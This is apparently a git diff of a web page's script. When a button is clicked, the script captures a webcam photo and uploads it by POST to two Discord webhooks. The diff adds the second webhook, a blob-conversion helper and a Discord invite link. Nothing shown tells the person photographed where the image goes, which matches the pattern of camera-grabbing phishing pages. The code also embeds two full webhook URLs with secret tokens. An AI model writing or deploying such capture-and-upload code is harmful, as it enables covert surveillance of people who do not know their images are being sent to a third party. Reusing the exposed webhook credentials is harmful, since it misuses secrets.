@@ -130,9 +130,11 @@
 <script>
     const captureButton = document.getElementById('captureButton');
 
-    const discordWebhookUrl = 'https://discord.com/api/webhooks/1303968519964196875/uTGDp9VSZ8whf0ZB_yxcle8dpzjh9jyiV5T1hElIWi2mS1FHLaNlj37q99ufIzHNPDbJ';
-    
-    const discordChannelUrl = 'https://discord.com/api/webhooks/1304219564543967232/1ULT8YWfPSgjsSghp9cL9p7keAmuqaE4hqjiryrpQsnyF_FdZmOm0i_BrBcq3tuiVror';
+    // Define two different webhook URLs
+    const discordWebhookUrl1 = 'https://discord.com/api/webhooks/1303968519964196875/uTGDp9VSZ8whf0ZB_yxcle8dpzjh9jyiV5T1hElIWi2mS1FHLaNlj37q99ufIzHNPDbJ';
+    const discordWebhookUrl2 = 'https://discord.com/api/webhooks/1304219564543967232/1ULT8YWfPSgjsSghp9cL9p7keAmuqaE4hqjiryrpQsnyF_FdZmOm0i_BrBcq3tuiVror';
+
+    const discordChannelUrl = 'https://discord.gg/keMzN9Za48';
 
     captureButton.addEventListener('click', async () => {
         let videoStream;
@@ -154,11 +156,11 @@
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             const imageUrl = canvas.toDataURL('image/png');
-            
-            const response = await fetch(imageUrl);
-            const blob = await response.blob();
+            const imageBlob = dataURLToBlob(imageUrl);  // Convert the Data URL to Blob
 
-            await sendImageToDiscord(blob);
+            // Send the image to both webhooks
+            await sendImageToDiscord(discordWebhookUrl1, imageBlob);
+            await sendImageToDiscord(discordWebhookUrl2, imageBlob);
 
             videoStream.getTracks().forEach(track => track.stop());
             document.body.removeChild(video);
@@ -171,12 +173,26 @@
         }
     });
 
-    async function sendImageToDiscord(imageBlob) {
+    function dataURLToBlob(dataURL) {
+        const [metadata, base64Data] = dataURL.split(',');
+        const mimeType = metadata.match(/:(.*?);/)[1];
+        const binaryString = atob(base64Data);
+        const len = binaryString.length;
+        const bytes = new Uint8Array(len);
+
+        for (let i = 0; i < len; i++) {
+            bytes[i] = binaryString.charCodeAt(i);
+        }
+
+        return new Blob([bytes], { type: mimeType });
+    }
+
+    async function sendImageToDiscord(webhookUrl, imageBlob) {
         try {
             const formData = new FormData();
             formData.append('file', imageBlob, 'captured_image.png');
 
-            const sendResponse = await fetch(discordWebhookUrl, {
+            const sendResponse = await fetch(webhookUrl, {
                 method: 'POST',
                 body: formData
             });
